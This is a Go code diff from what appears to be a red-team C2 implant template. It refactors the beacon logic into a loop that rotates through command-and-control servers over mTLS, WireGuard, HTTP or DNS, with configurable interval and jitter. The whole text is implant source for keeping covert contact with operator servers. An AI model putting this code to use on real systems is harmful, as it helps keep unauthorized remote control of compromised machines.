@@ -66,6 +66,7 @@ type Beacon struct {
 	Close BeaconClose
 }
 
+// Interval - Interval between beacons
 func (b *Beacon) Interval() int64 {
 	interval, err := strconv.ParseInt(`{{.Config.BeaconInterval}}`, 10, 64)
 	if err != nil {
@@ -74,6 +75,7 @@ func (b *Beacon) Interval() int64 {
 	return int64(interval)
 }
 
+// Jitter - Jitter between beacons
 func (b *Beacon) Jitter() int64 {
 	jitter, err := strconv.ParseInt(`{{.Config.BeaconJitter}}`, 10, 64)
 	if err != nil {
@@ -82,6 +84,7 @@ func (b *Beacon) Jitter() int64 {
 	return int64(jitter)
 }
 
+// Duration - Interval + random value <= Jitter
 func (b *Beacon) Duration() time.Duration {
 	// {{if .Config.Debug}}
 	log.Printf("Interval: %v Jitter: %v", b.Interval(), b.Jitter())
@@ -97,59 +100,76 @@ func (b *Beacon) Duration() time.Duration {
 	return duration
 }
 
-func NextBeacon() *Beacon {
+// StartBeaconLoop - Starts the beacon loop generator
+func StartBeaconLoop(c2s []string, abort <-chan struct{}) <-chan *Beacon {
 	// {{if .Config.Debug}}
 	log.Printf("Starting beacon loop ...")
 	// {{end}}
 
 	var beacon *Beacon
+	nextBeacon := make(chan *Beacon)
 
-	uri := nextCCServer()
-	// {{if .Config.Debug}}
-	log.Printf("Next CC = %s", uri.String())
-	// {{end}}
+	innerAbort := make(chan struct{})
+	c2Generator := C2Generator(c2s, innerAbort)
 
-	switch uri.Scheme {
+	go func() {
+		defer close(nextBeacon)
+		defer func() {
+			innerAbort <- struct{}{}
+		}()
 
-	// *** MTLS ***
-	// {{if .Config.MTLSc2Enabled}}
-	case "mtls":
-		beacon = mtlsBeacon(uri)
-		activeC2 = uri.String()
-		return beacon
-		// {{end}}  - MTLSc2Enabled
-	case "wg":
-		// *** WG ***
-		// {{if .Config.WGc2Enabled}}
-		beacon = wgBeacon(uri)
-		activeC2 = uri.String()
-		return beacon
-		// {{end}}  - WGc2Enabled
-	case "https":
-		fallthrough
-	case "http":
-		// *** HTTP ***
-		// {{if .Config.HTTPc2Enabled}}
-		beacon = httpBeacon(uri)
-		activeC2 = uri.String()
-		return beacon
-		// {{end}} - HTTPc2Enabled
-
-	case "dns":
-		// *** DNS ***
-		// {{if .Config.DNSc2Enabled}}
-		beacon = dnsBeacon(uri)
-		activeC2 = uri.String()
-		return beacon
-		// {{end}} - DNSc2Enabled
-
-	default:
 		// {{if .Config.Debug}}
-		log.Printf("Unknown c2 protocol %s", uri.Scheme)
+		log.Printf("Recv from c2 generator ...")
 		// {{end}}
-	}
+		for uri := range c2Generator {
+			// {{if .Config.Debug}}
+			log.Printf("Next CC = %s", uri.String())
+			// {{end}}
 
-	return nil
+			switch uri.Scheme {
+
+			// *** MTLS ***
+			// {{if .Config.MTLSc2Enabled}}
+			case "mtls":
+				beacon = mtlsBeacon(uri)
+				activeC2 = uri.String()
+				// {{end}}  - MTLSc2Enabled
+			case "wg":
+				// *** WG ***
+				// {{if .Config.WGc2Enabled}}
+				beacon = wgBeacon(uri)
+				activeC2 = uri.String()
+				// {{end}}  - WGc2Enabled
+			case "https":
+				fallthrough
+			case "http":
+				// *** HTTP ***
+				// {{if .Config.HTTPc2Enabled}}
+				beacon = httpBeacon(uri)
+				activeC2 = uri.String()
+				// {{end}} - HTTPc2Enabled
+
+			case "dns":
+				// *** DNS ***
+				// {{if .Config.DNSc2Enabled}}
+				beacon = dnsBeacon(uri)
+				activeC2 = uri.String()
+				// {{end}} - DNSc2Enabled
+
+			default:
+				// {{if .Config.Debug}}
+				log.Printf("Unknown c2 protocol %s", uri.Scheme)
+				// {{end}}
+			}
+			select {
+			case nextBeacon <- beacon:
+			case <-abort:
+				return
+			}
+		}
+	}()
+
+	return nextBeacon
 }
 
 // {{if .Config.MTLSc2Enabled}}
